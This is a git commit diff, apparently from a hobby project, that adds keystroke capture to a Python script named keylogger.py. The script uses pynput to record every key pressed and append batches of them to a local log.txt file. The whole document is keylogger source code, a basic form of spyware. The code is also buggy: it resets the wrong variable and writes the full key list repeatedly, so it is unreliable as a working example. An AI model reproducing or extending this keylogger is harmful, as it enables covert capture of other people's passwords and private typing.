c86bd112eaeb565c5e3837faac31a2f11571c670
Madany Diallo <Madanyx@gmail.com>
2020-10-31 03:41:13 -0400

    updates

--- keylogger.py
+++ keylogger.py
@@ -1,14 +1,39 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
+count = 0
+keys = []
+
 
 def on_pressed(key):
+    global keys, count
+
+    keys.append(key)
+    count = count + 1
     print("{0} pressed".format(key))
+
+# how often we would update the file
+    if count >= 10:
+        count = 0
+        write_file(str(keys))
+        key = []
 
 
 def on_released(key):
     if key == Key.esc:
         return False
+
+# function to write to a text file
+
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(keys).replace("'", " ")
+            if k.find("space") > 0:
+                f.write("\n")
+            elif k.find("Key") == -1:
+                f.write(k)
 
 
 # functions called when a button is pressed and released.
